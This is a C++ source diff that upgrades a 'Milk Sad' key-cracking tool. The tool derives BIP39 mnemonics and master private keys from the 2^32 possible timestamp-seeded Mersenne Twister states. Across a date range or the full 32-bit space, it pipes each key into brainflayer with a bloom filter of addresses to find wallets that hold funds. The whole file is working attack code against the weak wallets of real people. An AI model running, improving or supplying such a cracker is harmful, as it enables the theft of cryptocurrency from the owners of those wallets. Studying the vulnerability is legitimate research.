@@ -1,3 +1,9 @@
+/**
+ * Milk Sad Vulnerability Reproducer (Upgraded)
+ * Generates BIP39 Mnemonics based on 32-bit Time Seed (Mersenne Twister)
+ * checks against brainflayer via pipe.
+ */
+
 #include <iostream>
 #include <fstream>
 #include <random>
@@ -6,6 +12,7 @@
 #include <iomanip>
 #include <signal.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
 #include <unistd.h>
 #include <sstream>
 #include <ctime>
@@ -21,46 +28,26 @@
 #include <mutex>
 #include <chrono>
 #include <cstdio>
-#include <cstring>   // for strerror
+#include <cstring>
 #include <cerrno>
+#include <climits>
 
-// Configuration
+// --- Configuration ---
 const std::string WORDLIST_DIR = "./Wordlist/";
-const std::string OUTPUT_FILE_SINGLE_PREFIX = "mnemonic_";
-const std::string OUTPUT_FILE_RANGE_PREFIX = "mnemonics_range_";
-const std::string OUTPUT_FILE_FULL_PREFIX = "all_mnemonics_";
-const std::string PROGRESS_FILE_RANGE = "generation_progress_range.bin";
-const std::string PROGRESS_FILE_FULL = "generation_progress_full.bin";
-const size_t MNEMONIC_WORD_COUNT = 24;
-const uint64_t REPORT_INTERVAL = 10000000ULL;
-const int NUM_THREADS = 10;
+const std::string OUTPUT_FILE_PREFIX = "found_keys_";
+const uint64_t REPORT_INTERVAL = 100000; // Report to stdout every N keys per thread
+const int DEFAULT_NUM_THREADS = 4; // Default safe number
 
-// Available wordlists
-const std::vector<std::string> WORDLIST_FILES = {
-    "english.txt", "spanish.txt", "french.txt", "italian.txt",
-    "portuguese.txt", "japanese.txt", "korean.txt", "chinese_simplified.txt",
-    "chinese_traditional.txt", "russian.txt", "ukrainian.txt", "czech.txt"
-};
-
-// Global stop flag for signal handling
+// --- Global Flags ---
 std::atomic<bool> g_stop_flag(false);
 
+// --- Signal Handler ---
 void signal_handler(int) {
     g_stop_flag = true;
-    std::cout << "\nInterrupt received. Saving progress..." << std::endl;
+    std::cout << "\n[!] Interrupt received. Stopping threads..." << std::endl;
 }
 
-// Helper functions
-std::string remove_whitespace(const std::string& str) {
-    std::string result = str;
-    result.erase(std::remove_if(result.begin(), result.end(), ::isspace), result.end());
-    return result;
-}
-
-std::string get_filename_base(const std::string& wordlist) {
-    size_t dot_pos = wordlist.find('.');
-    return (dot_pos != std::string::npos) ? wordlist.substr(0, dot_pos) : wordlist;
-}
+// --- Helper Functions ---
 
 bool file_exists(const std::string& filename) {
     struct stat buffer;
@@ -69,153 +56,135 @@ bool file_exists(const std::string& filename) {
 
 std::vector<std::string> load_wordlist(const std::string& filename) {
     std::vector<std::string> wordlist;
-    std::ifstream file(WORDLIST_DIR + filename);
-    if (!file) {
-        std::cerr << "Error: Could not open wordlist file at " << WORDLIST_DIR + filename << std::endl;
-        exit(1);
+    std::string path = WORDLIST_DIR + filename;
+    
+    // Fallback: check current directory if not in Wordlist/
+    if (!file_exists(path) && file_exists(filename)) {
+        path = filename;
     }
+
+    std::ifstream file(path);
+    if (!file) {
+        throw std::runtime_error("Could not open wordlist: " + path);
+    }
+
     std::string word;
     while (std::getline(file, word)) {
-        word.erase(word.find_last_not_of(" \t\r\n") + 1);
-        if (!word.empty()) {
-            wordlist.push_back(word);
-        }
+        // Trim whitespace
+        size_t first = word.find_first_not_of(" \t\r\n");
+        if (first == std::string::npos) continue;
+        size_t last = word.find_last_not_of(" \t\r\n");
+        wordlist.push_back(word.substr(first, (last - first + 1)));
     }
+
     if (wordlist.size() != 2048) {
-        std::cerr << "Error: Wordlist must contain exactly 2048 words (found " << wordlist.size() << ")" << std::endl;
-        exit(1);
+        throw std::runtime_error("Wordlist must contain exactly 2048 words. Found: " + std::to_string(wordlist.size()));
     }
     return wordlist;
 }
 
+// --- Crypto Functions ---
+
+// SHA256 Helper
 std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
+    std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
     SHA256_CTX sha256_ctx;
     SHA256_Init(&sha256_ctx);
     SHA256_Update(&sha256_ctx, data.data(), data.size());
-    std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
     SHA256_Final(hash.data(), &sha256_ctx);
     return hash;
 }
 
+// Generate BIP39 Mnemonic from a 32-bit Time Seed (The Vulnerability)
 std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {
+    // 1. Initialize Mersenne Twister with the timestamp
     std::mt19937 engine(seed_value);
-    std::vector<uint8_t> entropy(32);
-    std::uniform_int_distribution<uint16_t> distribution(0, std::numeric_limits<uint8_t>::max());
 
-    for (size_t i = 0; i < 32; ++i) {
-        entropy[i] = static_cast<uint8_t>(distribution(engine));
+    // 2. Generate 256 bits (32 bytes) of entropy
+    // Note: Libbitcoin used std::random_device which was MT19937.
+    // We pull 32-bit blocks to be efficient and match typical RNG block generation.
+    std::vector<uint8_t> entropy(32);
+    for (size_t i = 0; i < 32; i += 4) {
+        uint32_t random_block = engine();
+        // Copy 4 bytes safely
+        std::memcpy(&entropy[i], &random_block, 4);
     }
 
+    // 3. Calculate Checksum (first 8 bits of SHA256(entropy))
     std::vector<uint8_t> hash = sha256(entropy);
-    const size_t CHECKSUM_LENGTH_BITS = entropy.size() * 8 / 32;
-    std::vector<uint8_t> combined_data = entropy;
-    combined_data.insert(combined_data.end(), hash.begin(), hash.begin() + (CHECKSUM_LENGTH_BITS + 7) / 8);
+    uint8_t checksum_byte = hash[0];
+
+    // 4. Combine Entropy + Checksum (Total 264 bits)
+    // We need to extract 11-bit chunks.
+    // Implementation: Construct a temporary buffer including checksum
+    std::vector<uint8_t> combined = entropy;
+    combined.push_back(checksum_byte); // We only need the top bits of this byte
 
     std::string mnemonic;
-    size_t combined_data_bit_index = 0;
-    for (size_t i = 0; i < MNEMONIC_WORD_COUNT; ++i) {
-        uint16_t word_index = 0;
-        for (int bit = 10; bit >= 0; --bit) {
-            size_t byte_index = combined_data_bit_index / 8;
-            int bit_in_byte = 7 - (combined_data_bit_index % 8);
+    mnemonic.reserve(256); // Pre-allocate memory
 
-            if (byte_index < combined_data.size()) {
-                if ((combined_data[byte_index] >> bit_in_byte) & 1) {
-                    word_index |= (1 << bit);
-                }
-                combined_data_bit_index++;
+    // Loop for 24 words
+    // Total bits = 264. 24 words * 11 bits = 264.
+    for (int i = 0; i < 24; ++i) {
+        int start_bit = i * 11;
+        int word_index = 0;
+
+        // Extract 11 bits starting from start_bit
+        for (int bit = 0; bit < 11; ++bit) {
+            int total_bit_pos = start_bit + bit;
+            int byte_pos = total_bit_pos / 8;
+            int bit_pos_in_byte = 7 - (total_bit_pos % 8); // Big Endian reading
+
+            if ((combined[byte_pos] >> bit_pos_in_byte) & 1) {
+                word_index |= (1 << (10 - bit));
             }
         }
-        if (!mnemonic.empty()) mnemonic += " ";
+
+        if (i > 0) mnemonic += " ";
         mnemonic += wordlist[word_index];
     }
+
     return mnemonic;
 }
 
-std::string mnemonic_to_private_key_hex(const std::string& mnemonic) {
-    // PBKDF2 with 2048 iterations, salt "mnemonic"
+// Convert Mnemonic to Root Private Key (BIP39 Seed -> BIP32 Master Key)
+std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
+    // 1. PBKDF2: Mnemonic + Salt("mnemonic") -> 512-bit Seed
     const int iterations = 2048;
-    const std::string salt = "mnemonic";
+    const std::string salt = "mnemonic"; // No passphrase used in this reproduction
     std::vector<uint8_t> seed(64);
-    PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
-                      reinterpret_cast<const unsigned char*>(salt.c_str()), salt.length(),
-                      iterations, EVP_sha512(), seed.size(), seed.data());
+    
+    if (PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
+                          reinterpret_cast<const unsigned char*>(salt.c_str()), salt.length(),
+                          iterations, EVP_sha512(), seed.size(), seed.data()) == 0) {
+        return "";
+    }
 
-    // HMAC-SHA512 with key "Bitcoin seed"
-    const std::string key = "Bitcoin seed";
-    std::vector<uint8_t> hmac(64);
+    // 2. HMAC-SHA512: Key("Bitcoin seed") + Data(Seed) -> Master Node (Private Key + Chain Code)
+    // We only need the first 32 bytes (Private Key) for brainflayer checking
+    const std::string hmac_key = "Bitcoin seed";
+    unsigned char hmac_result[64];
     unsigned int hmac_len;
-    HMAC(EVP_sha512(), key.c_str(), key.length(),
-         seed.data(), seed.size(), hmac.data(), &hmac_len);
+    
+    HMAC(EVP_sha512(), 
+         reinterpret_cast<const void*>(hmac_key.c_str()), hmac_key.length(),
+         seed.data(), seed.size(), 
+         hmac_result, &hmac_len);
 
-    // Private key is first 32 bytes
-    std::vector<uint8_t> privkey(hmac.begin(), hmac.begin() + 32);
+    // Convert first 32 bytes to Hex
     std::stringstream ss;
     ss << std::hex << std::setfill('0');
-    for (uint8_t byte : privkey) {
-        ss << std::setw(2) << (int)byte;
+    for (int i = 0; i < 32; ++i) {
+        ss << std::setw(2) << static_cast<int>(hmac_result[i]);
     }
     return ss.str();
 }
 
-void save_progress(const std::string& progress_file, uint32_t last_timestamp) {
-    std::ofstream out(progress_file, std::ios::binary);
-    if (out.is_open()) {
-        out.write(reinterpret_cast<const char*>(&last_timestamp), sizeof(last_timestamp));
-    } else {
-        std::cerr << "Error: Could not write to progress file " << progress_file << std::endl;
-    }
-}
+// --- Time Utilities ---
 
-uint32_t load_progress(const std::string& progress_file) {
-    if (!file_exists(progress_file)) return 0;
-    std::ifstream in(progress_file, std::ios::binary);
-    uint32_t last_timestamp;
-    if (in.is_open()) {
-        in.read(reinterpret_cast<char*>(&last_timestamp), sizeof(last_timestamp));
-        if (!in.good()) return 0;
-    } else {
-        return 0;
-    }
-    return last_timestamp;
-}
-
-std::tm parse_datetime(const std::string& datetime_str) {
-    std::tm tm = {};
-    std::stringstream ss(datetime_str);
-    ss >> std::get_time(&tm, "%Y-%m-%d %H:%M:%S");
-    if (ss.fail()) {
-        throw std::runtime_error("Invalid date/time format. Use YYYY-MM-DD HH:MM:SS");
-    }
-    return tm;
-}
-
-void parse_date_range(const std::string& range_str, std::tm& start_tm, std::tm& end_tm) {
-    std::string clean_str = remove_whitespace(range_str);
-    size_t colon_pos = clean_str.find(':');
-    if (colon_pos == std::string::npos) {
-        throw std::runtime_error("Invalid format. Use YYYY-MM-DD:YYYY-MM-DD");
-    }
-    std::string start_str = clean_str.substr(0, colon_pos);
-    std::string end_str = clean_str.substr(colon_pos + 1);
-    std::stringstream ss_start(start_str);
-    ss_start >> std::get_time(&start_tm, "%Y-%m-%d");
-    if (ss_start.fail()) throw std::runtime_error("Invalid start date format.");
-    std::stringstream ss_end(end_str);
-    ss_end >> std::get_time(&end_tm, "%Y-%m-%d");
-    if (ss_end.fail()) throw std::runtime_error("Invalid end date format.");
-}
-
-uint32_t get_unix_timestamp(int year, int month, int day, int hour, int minute, int second) {
-    std::tm t{};
-    t.tm_year = year - 1900;
-    t.tm_mon = month - 1;
-    t.tm_mday = day;
-    t.tm_hour = hour;
-    t.tm_min = minute;
-    t.tm_sec = second;
-    t.tm_isdst = 0;
-
+uint32_t get_unix_timestamp(const std::tm& tm) {
+    std::tm temp_tm = tm;
+    // Set environment to UTC to ensure mktime treats input as UTC
     #ifdef _WIN32
         _putenv("TZ=UTC");
         _tzset();
@@ -223,293 +192,203 @@ uint32_t get_unix_timestamp(int year, int month, int day, int hour, int minute, 
         setenv("TZ", "UTC", 1);
         tzset();
     #endif
-
-    std::time_t timestamp = std::mktime(&t);
-    if (timestamp == -1) throw std::runtime_error("Invalid date/time for timestamp conversion");
-    return static_cast<uint32_t>(timestamp);
+    
+    time_t ts = std::mktime(&temp_tm);
+    if (ts == -1) throw std::runtime_error("Invalid time format");
+    return static_cast<uint32_t>(ts);
 }
 
-int select_wordlist() {
-    std::cout << "Available wordlists:\n";
-    for (size_t i = 0; i < WORDLIST_FILES.size(); ++i) {
-        std::cout << i + 1 << ". " << WORDLIST_FILES[i] << "\n";
-    }
-    std::cout << "Select wordlist (1-" << WORDLIST_FILES.size() << "): ";
-    int choice;
-    while (true) {
-        std::cin >> choice;
-        if (std::cin.fail() || choice < 1 || choice > static_cast<int>(WORDLIST_FILES.size())) {
-            std::cin.clear();
-            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-            std::cout << "Invalid choice. Please enter a number between 1 and " << WORDLIST_FILES.size() << ": ";
-        } else {
-            break;
-        }
-    }
-    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-    return choice - 1;
+std::tm parse_iso_date(const std::string& s) {
+    std::tm tm = {};
+    std::stringstream ss(s);
+    ss >> std::get_time(&tm, "%Y-%m-%d");
+    if (ss.fail()) throw std::runtime_error("Parse error. Use YYYY-MM-DD");
+    tm.tm_isdst = 0;
+    return tm;
 }
 
-// Worker thread function
-void worker(uint32_t start, uint32_t end, int thread_id,
-            const std::vector<std::string>& wordlist,
-            std::atomic<uint64_t>& total_processed,
-            std::mutex& cout_mutex) {
-    // Log thread start
-    {
-        std::lock_guard<std::mutex> lock(cout_mutex);
-        std::cout << "Thread " << thread_id << " starting: range [" << start << ", " << end << "]" << std::endl;
-    }
+// --- Worker Thread ---
 
-    std::string progress_file = "progress_thread_" + std::to_string(thread_id) + ".bin";
-    uint32_t current = load_progress(progress_file);
-    if (current < start || current > end) current = start;
-
-    // Open pipe to brainflayer
-    std::string cmd = "./brainflayer/brainflayer -v -b ./040823BF.blf -i - -t priv -x > brainflayer_out_" +
-                      std::to_string(thread_id) + ".txt 2>&1";
-    FILE* fp = popen(cmd.c_str(), "w");
-    if (!fp) {
-        std::lock_guard<std::mutex> lock(cout_mutex);
-        std::cerr << "Thread " << thread_id << " failed to open brainflayer pipe: " << strerror(errno) << std::endl;
+void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id, 
+                   const std::vector<std::string>& wordlist,
+                   std::atomic<uint64_t>& global_counter,
+                   std::mutex& print_mtx) {
+    
+    // Command to pipe into brainflayer
+    // -i - : read from stdin
+    // -t priv : input is hex private keys
+    // -x : output format hex
+    std::string cmd = "./brainflayer/brainflayer -v -b ./040823BF.blf -i - -t priv -x > brainflayer_found_" + std::to_string(thread_id) + ".txt 2>&1";
+    
+    FILE* pipe = popen(cmd.c_str(), "w");
+    if (!pipe) {
+        std::lock_guard<std::mutex> lock(print_mtx);
+        std::cerr << "[Thread " << thread_id << "] Error: Failed to open brainflayer pipe." << std::endl;
         return;
     }
 
-    uint64_t local_count = 0;
-    for (uint32_t ts = current; ts <= end && !g_stop_flag; ++ts) {
+    uint64_t local_processed = 0;
+    
+    for (uint32_t ts = start_ts; ts <= end_ts && !g_stop_flag; ++ts) {
+        // Core Logic
         std::string mnemonic = generate_mnemonic_bip39(ts, wordlist);
-        std::string privkey = mnemonic_to_private_key_hex(mnemonic);
-        fprintf(fp, "%s\n", privkey.c_str());
-        fflush(fp);
-
-        total_processed.fetch_add(1, std::memory_order_relaxed);
-        local_count++;
-
-        if (ts % 100000 == 0 || ts == end) {
-            save_progress(progress_file, ts + 1);
+        std::string priv_hex = mnemonic_to_root_key_hex(mnemonic);
+        
+        // Write to brainflayer
+        if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) {
+             // Pipe broken
+             break;
         }
 
-        if (ts % REPORT_INTERVAL == 0 && ts != 0) {
-            std::lock_guard<std::mutex> lock(cout_mutex);
-            std::cout << "Thread " << thread_id << " reached timestamp " << ts << " (" << local_count << " keys)" << std::endl;
+        local_processed++;
+        global_counter.fetch_add(1, std::memory_order_relaxed);
+
+        // Progress logging
+        if (local_processed % REPORT_INTERVAL == 0) {
+            std::lock_guard<std::mutex> lock(print_mtx);
+            std::cout << "[Thread " << thread_id << "] Current TS: " << ts 
+                      << " | Processed: " << local_processed << std::endl;
         }
     }
 
-    pclose(fp);
-    if (!g_stop_flag) {
-        unlink(progress_file.c_str());
-    }
-
+    pclose(pipe);
+    
     {
-        std::lock_guard<std::mutex> lock(cout_mutex);
-        std::cout << "Thread " << thread_id << " finished. Processed " << local_count << " keys." << std::endl;
+        std::lock_guard<std::mutex> lock(print_mtx);
+        std::cout << "[Thread " << thread_id << "] Finished. Total processed: " << local_processed << std::endl;
     }
 }
 
-// Monitor thread function
-void monitor(uint64_t total, std::atomic<uint64_t>& processed, std::atomic<bool>& stop_flag) {
-    auto start = std::chrono::steady_clock::now();
-    while (!stop_flag) {
-        std::this_thread::sleep_for(std::chrono::seconds(1));
-        uint64_t p = processed.load();
-        double percent = (double)p / total * 100.0;
-        auto now = std::chrono::steady_clock::now();
-        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
-        double rate = (elapsed > 0) ? (double)p / elapsed : 0;
-        std::cout << "\rProgress: " << std::fixed << std::setprecision(2) << percent
-                  << "% (" << p << "/" << total << ") | Rate: " << rate << " keys/s" << std::flush;
-    }
-    std::cout << std::endl;
-}
+// --- Main Menu & Logic ---
 
 int main() {
+    // 1. Prevent crash on broken pipe (if brainflayer closes early)
+    signal(SIGPIPE, SIG_IGN);
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
 
-    // Initialize OpenSSL algorithms
     OpenSSL_add_all_algorithms();
 
-    std::cout << "Milk Sad Mnemonic Generator (Multithreaded + Brainflayer Integration)" << std::endl;
-    std::cout << "------------------------------------------------------------------------" << std::endl;
-    std::cout << "Developed by z1ph1us (upgraded)" << std::endl;
-    std::cout << "------------------------------------------------------------------------" << std::endl;
+    std::cout << "=============================================" << std::endl;
+    std::cout << "   Milk Sad Vulnerability Reproducer (v2.0)  " << std::endl;
+    std::cout << "=============================================" << std::endl;
 
-    // Check for brainflayer and bloom filter
+    // 2. Check Prerequisites
     if (!file_exists("./brainflayer/brainflayer")) {
-        std::cerr << "Error: brainflayer executable not found at ./brainflayer/brainflayer" << std::endl;
-        std::cerr << "Please ensure brainflayer is compiled and placed in the correct directory." << std::endl;
+        std::cerr << "Error: ./brainflayer/brainflayer executable not found!" << std::endl;
         return 1;
     }
     if (!file_exists("./040823BF.blf")) {
-        std::cerr << "Error: bloom filter file 040823BF.blf not found in current directory." << std::endl;
+        std::cerr << "Error: Bloom filter ./040823BF.blf not found!" << std::endl;
         return 1;
     }
 
-    int wordlist_choice = select_wordlist();
-    std::string wordlist_name = WORDLIST_FILES[wordlist_choice];
-    std::string wordlist_base = get_filename_base(wordlist_name);
-    std::cout << "Loading " << wordlist_name << " wordlist..." << std::endl;
-    auto wordlist = load_wordlist(wordlist_name);
+    // 3. Load Wordlist
+    std::vector<std::string> wordlist;
+    try {
+        std::cout << "[*] Loading english.txt..." << std::endl;
+        wordlist = load_wordlist("english.txt");
+    } catch (const std::exception& e) {
+        std::cerr << "Error: " << e.what() << std::endl;
+        std::cerr << "Make sure 'english.txt' is in ./Wordlist/ or current directory." << std::endl;
+        return 1;
+    }
 
-    std::cout << "Options:\n";
-    std::cout << "1. Generate private key for a specific date/time (single).\n";
-    std::cout << "2. Generate and check private keys for a date range (using 10 threads + brainflayer).\n";
-    std::cout << "3. Generate and check private keys for the full Unix timestamp range (using 10 threads + brainflayer).\n";
-    std::cout << "Type your choice (1, 2, or 3) and press Enter: ";
-
+    // 4. User Input
     int choice;
+    std::cout << "\nSelect Mode:\n";
+    std::cout << "1. Single Timestamp Check\n";
+    std::cout << "2. Date Range Scan (Multithreaded)\n";
+    std::cout << "3. Full 32-bit Scan (Warning: Long duration)\n";
+    std::cout << "> ";
     std::cin >> choice;
-    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
 
-    if (choice < 1 || choice > 3) {
-        std::cerr << "Error: Invalid choice." << std::endl;
+    uint32_t start_ts = 0, end_ts = 0;
+
+    if (choice == 1) {
+        std::string date_str, time_str;
+        std::cout << "Enter Date (YYYY-MM-DD): ";
+        std::cin >> date_str;
+        std::cout << "Enter Time (HH:MM:SS): ";
+        std::cin >> time_str;
+
+        std::tm tm = parse_iso_date(date_str);
+        sscanf(time_str.c_str(), "%d:%d:%d", &tm.tm_hour, &tm.tm_min, &tm.tm_sec);
+        
+        uint32_t ts = get_unix_timestamp(tm);
+        std::cout << "\nChecking Timestamp: " << ts << std::endl;
+        
+        std::string m = generate_mnemonic_bip39(ts, wordlist);
+        std::string k = mnemonic_to_root_key_hex(m);
+        std::cout << "Mnemonic: " << m << std::endl;
+        std::cout << "Root Key: " << k << std::endl;
+        
+        // Single check cmd
+        std::string cmd = "echo " + k + " | ./brainflayer/brainflayer -v -b ./040823BF.blf -i - -t priv -x";
+        system(cmd.c_str());
+        return 0;
+
+    } else if (choice == 2) {
+        std::string start_str, end_str;
+        std::cout << "Start Date (YYYY-MM-DD): ";
+        std::cin >> start_str;
+        std::cout << "End Date   (YYYY-MM-DD): ";
+        std::cin >> end_str;
+
+        std::tm tm_start = parse_iso_date(start_str);
+        std::tm tm_end = parse_iso_date(end_str);
+        
+        // Set start to 00:00:00
+        tm_start.tm_hour = 0; tm_start.tm_min = 0; tm_start.tm_sec = 0;
+        // Set end to 23:59:59
+        tm_end.tm_hour = 23; tm_end.tm_min = 59; tm_end.tm_sec = 59;
+
+        start_ts = get_unix_timestamp(tm_start);
+        end_ts = get_unix_timestamp(tm_end);
+
+    } else if (choice == 3) {
+        start_ts = 0;
+        end_ts = UINT_MAX;
+    } else {
+        std::cout << "Invalid choice." << std::endl;
         return 1;
     }
 
-    // Mode 1: single timestamp
-    if (choice == 1) {
-        std::string datetime_str;
-        std::cout << "Enter the date/time (YYYY-MM-DD HH:MM:SS): ";
-        std::getline(std::cin, datetime_str);
+    int num_threads = DEFAULT_NUM_THREADS;
+    std::cout << "Enter number of threads (Default " << DEFAULT_NUM_THREADS << "): ";
+    if (std::cin.peek() != '\n') std::cin >> num_threads;
+    
+    if (num_threads < 1) num_threads = 1;
 
-        std::tm tm;
-        try {
-            tm = parse_datetime(datetime_str);
-        } catch (const std::runtime_error& e) {
-            std::cerr << "Error: " << e.what() << std::endl;
-            return 1;
-        }
+    std::cout << "\n[*] Starting Scan..." << std::endl;
+    std::cout << "Range: " << start_ts << " to " << end_ts << std::endl;
+    std::cout << "Total keys: " << (uint64_t)end_ts - start_ts << std::endl;
 
-        uint32_t timestamp = get_unix_timestamp(
-            tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
-            tm.tm_hour, tm.tm_min, tm.tm_sec
-        );
+    // 5. Thread Distribution
+    std::vector<std::thread> threads;
+    std::atomic<uint64_t> total_counter(0);
+    std::mutex print_mutex;
 
-        std::string mnemonic = generate_mnemonic_bip39(timestamp, wordlist);
-        std::string privkey = mnemonic_to_private_key_hex(mnemonic);
+    uint64_t total_range = (uint64_t)end_ts - start_ts + 1;
+    uint64_t chunk_size = total_range / num_threads;
 
-        std::cout << "Timestamp: " << timestamp << std::endl;
-        std::cout << "Mnemonic: " << mnemonic << std::endl;
-        std::cout << "Private key (hex): " << privkey << std::endl;
+    for (int i = 0; i < num_threads; ++i) {
+        uint32_t t_start = start_ts + (i * chunk_size);
+        uint32_t t_end = (i == num_threads - 1) ? end_ts : t_start + chunk_size - 1;
 
-        // Optionally check with brainflayer immediately
-        std::string cmd = "echo \"" + privkey + "\" | ./brainflayer/brainflayer -v -b ./040823BF.blf -i - -t priv -x";
-        std::cout << "Running brainflayer check..." << std::endl;
-        int ret = system(cmd.c_str());
-        if (ret != 0) {
-            std::cerr << "Brainflayer returned error code " << ret << std::endl;
-        }
-
-        // Save mnemonic to file as before
-        std::string output_file = OUTPUT_FILE_SINGLE_PREFIX + wordlist_base + ".txt";
-        std::ofstream outfile(output_file);
-        if (outfile.is_open()) {
-            outfile << mnemonic << std::endl;
-            outfile.close();
-            std::cout << "Mnemonic saved to " << output_file << std::endl;
-        } else {
-            std::cerr << "Error opening output file " << output_file << std::endl;
-        }
+        threads.emplace_back(worker_thread, t_start, t_end, i, 
+                             std::cref(wordlist), 
+                             std::ref(total_counter), 
+                             std::ref(print_mutex));
     }
-    // Mode 2: date range
-    else if (choice == 2) {
-        std::string date_range_str;
-        std::cout << "Enter the date range in format YYYY-MM-DD:YYYY-MM-DD (Start:End): ";
-        std::getline(std::cin, date_range_str);
 
-        std::tm start_tm = {}, end_tm = {};
-        try {
-            parse_date_range(date_range_str, start_tm, end_tm);
-        } catch (const std::runtime_error& e) {
-            std::cerr << "Error: " << e.what() << std::endl;
-            return 1;
-        }
-
-        uint32_t start_timestamp = get_unix_timestamp(
-            start_tm.tm_year + 1900, start_tm.tm_mon + 1, start_tm.tm_mday, 0, 0, 0);
-        uint32_t end_timestamp = get_unix_timestamp(
-            end_tm.tm_year + 1900, end_tm.tm_mon + 1, end_tm.tm_mday, 0, 0, 0);
-
-        if (start_timestamp > end_timestamp) {
-            std::cerr << "Error: Start date must be before or equal to end date." << std::endl;
-            return 1;
-        }
-
-        std::cout << "Generating and checking private keys for timestamps between "
-                  << start_timestamp << " and " << end_timestamp << std::endl;
-        std::cout << "Using " << NUM_THREADS << " threads." << std::endl;
-
-        uint64_t total = static_cast<uint64_t>(end_timestamp) - start_timestamp + 1;
-        uint64_t chunk_size = total / NUM_THREADS;
-        std::vector<std::thread> threads;
-        std::atomic<uint64_t> total_processed(0);
-        std::mutex cout_mutex;
-
-        // Launch worker threads
-        for (int i = 0; i < NUM_THREADS; ++i) {
-            uint32_t thread_start = start_timestamp + i * chunk_size;
-            uint32_t thread_end = (i == NUM_THREADS - 1) ? end_timestamp :
-                                   start_timestamp + (i + 1) * chunk_size - 1;
-            threads.emplace_back(worker, thread_start, thread_end, i,
-                                 std::ref(wordlist), std::ref(total_processed), std::ref(cout_mutex));
-        }
-
-        // Launch monitor thread
-        std::thread monitor_thread(monitor, total, std::ref(total_processed), std::ref(g_stop_flag));
-
-        // Wait for all workers to finish
-        for (auto& t : threads) {
-            t.join();
-        }
-
-        // Signal monitor to stop and wait
-        g_stop_flag = true;
-        monitor_thread.join();
-
-        std::cout << "\nAll threads finished. Check brainflayer_out_*.txt for matches." << std::endl;
+    // Wait for threads
+    for (auto& t : threads) {
+        if (t.joinable()) t.join();
     }
-    // Mode 3: full range
-    else if (choice == 3) {
-        std::cout << "Generating and checking private keys for the full 32-bit Unix timestamp range." << std::endl;
-        std::cout << "Using " << NUM_THREADS << " threads." << std::endl;
 
-        uint64_t total_full = 0x100000000ULL; // 2^32
-        uint64_t chunk_size = total_full / NUM_THREADS;
-        uint64_t remainder = total_full % NUM_THREADS;
-
-        std::vector<std::thread> threads;
-        std::atomic<uint64_t> total_processed(0);
-        std::mutex cout_mutex;
-
-        for (int i = 0; i < NUM_THREADS; ++i) {
-            uint32_t thread_start = i * chunk_size;
-            uint32_t thread_end = (i + 1) * chunk_size - 1;
-            // Distribute remainder to first 'remainder' threads
-            if (i < remainder) {
-                thread_end += 1;
-            }
-            // For last thread, ensure it covers up to 0xFFFFFFFF
-            if (i == NUM_THREADS - 1) {
-                thread_end = 0xFFFFFFFF;
-            }
-            // Sanity check
-            if (thread_end < thread_start) thread_end = thread_start;
-
-            threads.emplace_back(worker, thread_start, thread_end, i,
-                                 std::ref(wordlist), std::ref(total_processed), std::ref(cout_mutex));
-        }
-
-        std::thread monitor_thread(monitor, total_full, std::ref(total_processed), std::ref(g_stop_flag));
-
-        for (auto& t : threads) {
-            t.join();
-        }
-
-        g_stop_flag = true;
-        monitor_thread.join();
-
-        std::cout << "\nAll threads finished. Check brainflayer_out_*.txt for matches." << std::endl;
-    }
+    std::cout << "\n[!] Scan Complete." << std::endl;
+    std::cout << "Check 'brainflayer_found_*.txt' files for any hits." << std::endl;
 
     return 0;
 }
